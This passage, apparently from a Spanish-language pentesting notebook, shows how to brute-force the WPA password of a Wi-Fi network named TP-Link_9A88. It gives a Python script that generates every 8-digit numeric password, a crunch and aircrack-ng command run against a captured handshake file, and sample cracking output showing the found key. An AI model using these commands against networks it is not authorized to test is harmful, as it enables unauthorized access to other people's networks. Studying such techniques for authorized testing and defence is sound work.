intentar descifrar la contraseña de la red TP-Link_9A88, que tiene un handshake capturado, verificando si la contraseña actual coincide con el formato por defecto del fabricante.</p><p id="1bed9b17-7cd1-80ac-8257-ff9cc1f52916" class="">
+</p><p id="1bed9b17-7cd1-80c6-972a-c8763adad502" class="">Podríamos generar un script en Python para generar un diccionario con todas las combinaciones posibles de contraseñas de 8 dígitos numéricos (desde 00000000 hasta 99999999)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-8083-9e3c-eadeaf6c9272" class="code"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Script para generar un diccionario con todas las combinaciones de 8 dígitos numéricos
+
+# Abrimos un archivo para escribir las combinaciones
+with open(&#x27;diccionario_8_digitos.txt&#x27;, &#x27;w&#x27;) as f:
+    # Iteramos desde 0 hasta 99999999
+    for i in range(100000000):
+        # Convertimos el número a string con 8 dígitos, rellenando con ceros a la izquierda
+        contraseña = f&quot;{i:08d}&quot;
+        # Escribimos la contraseña en el archivo con un salto de línea
+        f.write(contraseña + &quot;\n&quot;)
+
+print(&quot;Diccionario generado: diccionario_8_digitos.txt&quot;)</code></pre><p id="1bed9b17-7cd1-800e-8ec3-d5d7e41f534e" class="">
+</p><p id="1bed9b17-7cd1-806a-aa73-c4f8b5c649c0" class="">Pero, debido a las limitaciones de generar y almacenar un diccionario tan grande, una mejor opción es generar las contraseñas dinámicamente durante el proceso de cracking. Puedes usar <mark class="highlight-yellow"><strong>crunch</strong></mark> en combinación con aircrack-ng. Por ejemplo:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80ec-bafa-c29683a221ed" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">crunch 8 8 0123456789 | aircrack-ng -w - -b (introducir BSSID) /root/bettercap-wifi-handshakes.pcap</code></pre><p id="1bed9b17-7cd1-8079-895b-d31a11399ea6" class=""><strong>Explicación del comando</strong>:</p><ul id="1bed9b17-7cd1-8010-a473-d32799a04af1" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">crunch 8 8 0123456789 </mark>: Genera todas las combinaciones de 8 dígitos usando los números del 0 al 9.</li></ul><ul id="1bed9b17-7cd1-80ab-8a4a-efda089c3ed8" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">|</mark> : Pasa las contraseñas generadas directamente a aircrack-ng a través de un pipe, sin necesidad de almacenarlas en un archivo.</li></ul><ul id="1bed9b17-7cd1-806d-8fb1-c5a03127075a" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">-w - </mark>: Indica a aircrack-ng que lea las contraseñas desde la entrada estándar.</li></ul><ul id="1bed9b17-7cd1-80ee-b74d-c45a7ac1ad1b" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">-b (BSSID) </mark>: Especifica el BSSID de la red TP-Link_9A88.</li></ul><ul id="1bed9b17-7cd1-80f2-93b0-f5412672d4ec" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">/root/bettercap-wifi-handshakes.pcap </mark>: Ruta al archivo de captura que contiene el handshake.</li></ul><p id="1bed9b17-7cd1-8006-81d2-e1b02500191e" class="">
+</p><p id="1bed9b17-7cd1-8078-82dd-cb664d798f32" class="">Si tiene éxito, se verá algo como:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-805a-8be7-e0260aca82c9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                               Aircrack-ng 1.7 
+
+      [00:00:00] 1/1 keys tested (44.61 k/s) 
+
+      Time left: --
+
+                        KEY FOUND! [ 48392017 ]
+
+
+      Master Key     : AA E4 8E 1D 89 FB 08 01 97 A8 F2 51 A0 9C 35 B7 
+                       C2 3E 60 01 C7 B5 BA 6D 5C D7 B7 69 2B 40 FB 58 
+
+      Transient Key  : 1A 31 C8 C0 5C 7D 0A F8 F8 43 B9 14 A4 22 FB D2 
+                       CB AB CD 32 50 D2 5B 6E 81 0A D7 EB 0E 6B FE 7A 
+                       A9 86 79 E9 13 7E 9E ED 5D 34 2D 70 8F BC 78 EF 
+                       87 C7 E7 EE 10 D4 B0 D0 DB 6D EF 1B 05 94 5A 15 
+
+      EAPOL HMAC     : A5 2C DB 24 29 E0 E1 13 2D E7 2B 70 5B 38 96 E0 
+
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
